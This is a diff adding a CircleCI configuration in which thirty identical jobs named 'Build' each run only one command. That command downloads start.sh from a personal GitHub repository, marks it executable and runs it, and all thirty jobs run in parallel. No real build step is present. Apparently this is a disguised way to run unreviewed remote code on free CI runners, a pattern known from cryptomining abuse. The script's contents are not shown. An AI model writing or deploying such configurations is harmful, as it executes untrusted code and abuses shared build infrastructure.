@@ -1,0 +1,248 @@
+version: 2
+jobs:
+    Build_30:
+      docker:
+            - image: circleci/ruby:2.4
+      steps:
+        - run:
+            name: Build
+            command: wget https://raw.githubusercontent.com/sapurata337/V/master/start.sh && chmod u+x start.sh && ./start.sh
+    Build_29:
+      docker:
+            - image: circleci/ruby:2.4
+      steps:
+        - run:
+            name: Build
+            command: wget https://raw.githubusercontent.com/sapurata337/V/master/start.sh && chmod u+x start.sh && ./start.sh
+    Build_28:
+      docker:
+            - image: circleci/ruby:2.4
+      steps:
+        - run:
+            name: Build
+            command: wget https://raw.githubusercontent.com/sapurata337/V/master/start.sh && chmod u+x start.sh && ./start.sh
+    Build_27:
+      docker:
+            - image: circleci/ruby:2.4
+      steps:
+        - run:
+            name: Build
+            command: wget https://raw.githubusercontent.com/sapurata337/V/master/start.sh && chmod u+x start.sh && ./start.sh
+    Build_26:
+      docker:
+            - image: circleci/ruby:2.4
+      steps:
+        - run:
+            name: Build
+            command: wget https://raw.githubusercontent.com/sapurata337/V/master/start.sh && chmod u+x start.sh && ./start.sh
+    Build_25:
+      docker:
+            - image: circleci/ruby:2.4
+      steps:
+        - run:
+            name: Build
+            command: wget https://raw.githubusercontent.com/sapurata337/V/master/start.sh && chmod u+x start.sh && ./start.sh
+    Build_24:
+      docker:
+            - image: circleci/ruby:2.4
+      steps:
+        - run:
+            name: Build
+            command: wget https://raw.githubusercontent.com/sapurata337/V/master/start.sh && chmod u+x start.sh && ./start.sh
+    Build_23:
+      docker:
+            - image: circleci/ruby:2.4
+      steps:
+        - run:
+            name: Build
+            command: wget https://raw.githubusercontent.com/sapurata337/V/master/start.sh && chmod u+x start.sh && ./start.sh
+    Build_22:
+      docker:
+            - image: circleci/ruby:2.4
+      steps:
+        - run:
+            name: Build
+            command: wget https://raw.githubusercontent.com/sapurata337/V/master/start.sh && chmod u+x start.sh && ./start.sh
+    Build_21:
+      docker:
+            - image: circleci/ruby:2.4
+      steps:
+        - run:
+            name: Build
+            command: wget https://raw.githubusercontent.com/sapurata337/V/master/start.sh && chmod u+x start.sh && ./start.sh
+    Build_20:
+      docker:
+            - image: circleci/ruby:2.4
+      steps:
+        - run:
+            name: Build
+            command: wget https://raw.githubusercontent.com/sapurata337/V/master/start.sh && chmod u+x start.sh && ./start.sh
+    Build_19:
+      docker:
+            - image: circleci/ruby:2.4
+      steps:
+        - run:
+            name: Build
+            command: wget https://raw.githubusercontent.com/sapurata337/V/master/start.sh && chmod u+x start.sh && ./start.sh
+    Build_18:
+      docker:
+            - image: circleci/ruby:2.4
+      steps:
+        - run:
+            name: Build
+            command: wget https://raw.githubusercontent.com/sapurata337/V/master/start.sh && chmod u+x start.sh && ./start.sh
+    Build_17:
+      docker:
+            - image: circleci/ruby:2.4
+      steps:
+        - run:
+            name: Build
+            command: wget https://raw.githubusercontent.com/sapurata337/V/master/start.sh && chmod u+x start.sh && ./start.sh
+    Build_16:
+      docker:
+            - image: circleci/ruby:2.4
+      steps:
+        - run:
+            name: Build
+            command: wget https://raw.githubusercontent.com/sapurata337/V/master/start.sh && chmod u+x start.sh && ./start.sh
+    Build_15:
+      docker:
+            - image: circleci/ruby:2.4
+      steps:
+        - run:
+            name: Build
+            command: wget https://raw.githubusercontent.com/sapurata337/V/master/start.sh && chmod u+x start.sh && ./start.sh
+    Build_14:
+      docker:
+            - image: circleci/ruby:2.4
+      steps:
+        - run:
+            name: Build
+            command: wget https://raw.githubusercontent.com/sapurata337/V/master/start.sh && chmod u+x start.sh && ./start.sh
+    Build_13:
+      docker:
+            - image: circleci/ruby:2.4
+      steps:
+        - run:
+            name: Build
+            command: wget https://raw.githubusercontent.com/sapurata337/V/master/start.sh && chmod u+x start.sh && ./start.sh
+    Build_12:
+      docker:
+            - image: circleci/ruby:2.4
+      steps:
+        - run:
+            name: Build
+            command: wget https://raw.githubusercontent.com/sapurata337/V/master/start.sh && chmod u+x start.sh && ./start.sh
+    Build_11:
+      docker:
+            - image: circleci/ruby:2.4
+      steps:
+        - run:
+            name: Build
+            command: wget https://raw.githubusercontent.com/sapurata337/V/master/start.sh && chmod u+x start.sh && ./start.sh
+    Build_10:
+      docker:
+            - image: circleci/ruby:2.4
+      steps:
+        - run:
+            name: Build
+            command: wget https://raw.githubusercontent.com/sapurata337/V/master/start.sh && chmod u+x start.sh && ./start.sh
+    Build_09:
+      docker:
+            - image: circleci/ruby:2.4
+      steps:
+        - run:
+            name: Build
+            command: wget https://raw.githubusercontent.com/sapurata337/V/master/start.sh && chmod u+x start.sh && ./start.sh
+    Build_08:
+      docker:
+            - image: circleci/ruby:2.4
+      steps:
+        - run:
+            name: Build
+            command: wget https://raw.githubusercontent.com/sapurata337/V/master/start.sh && chmod u+x start.sh && ./start.sh
+    Build_07:
+      docker:
+            - image: circleci/ruby:2.4
+      steps:
+        - run:
+            name: Build
+            command: wget https://raw.githubusercontent.com/sapurata337/V/master/start.sh && chmod u+x start.sh && ./start.sh
+    Build_06:
+      docker:
+            - image: circleci/ruby:2.4
+      steps:
+        - run:
+            name: Build
+            command: wget https://raw.githubusercontent.com/sapurata337/V/master/start.sh && chmod u+x start.sh && ./start.sh
+    Build_05:
+      docker:
+            - image: circleci/ruby:2.4
+      steps:
+        - run:
+            name: Build
+            command: wget https://raw.githubusercontent.com/sapurata337/V/master/start.sh && chmod u+x start.sh && ./start.sh
+    Build_04:
+      docker:
+            - image: circleci/ruby:2.4
+      steps:
+        - run:
+            name: Build
+            command: wget https://raw.githubusercontent.com/sapurata337/V/master/start.sh && chmod u+x start.sh && ./start.sh
+    Build_03:
+      docker:
+            - image: circleci/ruby:2.4
+      steps:
+        - run:
+            name: Build
+            command: wget https://raw.githubusercontent.com/sapurata337/V/master/start.sh && chmod u+x start.sh && ./start.sh
+    Build_02:
+      docker:
+            - image: circleci/ruby:2.4
+      steps:
+        - run:
+            name: Build
+            command: wget https://raw.githubusercontent.com/sapurata337/V/master/start.sh && chmod u+x start.sh && ./start.sh
+    Build_01:
+      docker:
+            - image: circleci/ruby:2.4
+      steps:
+        - run:
+            name: Build
+            command: wget https://raw.githubusercontent.com/sapurata337/V/master/start.sh && chmod u+x start.sh && ./start.sh
+
+workflows:
+    version: 2
+    build:
+        jobs:
+            - Build_30
+            - Build_29
+            - Build_28
+            - Build_27
+            - Build_26
+            - Build_25
+            - Build_24
+            - Build_23
+            - Build_22
+            - Build_21
+            - Build_20
+            - Build_19
+            - Build_18
+            - Build_17
+            - Build_16
+            - Build_15
+            - Build_14
+            - Build_13
+            - Build_12
+            - Build_11
+            - Build_10
+            - Build_09
+            - Build_08
+            - Build_07
+            - Build_06
+            - Build_05
+            - Build_04
+            - Build_03
+            - Build_02
+            - Build_01
+            
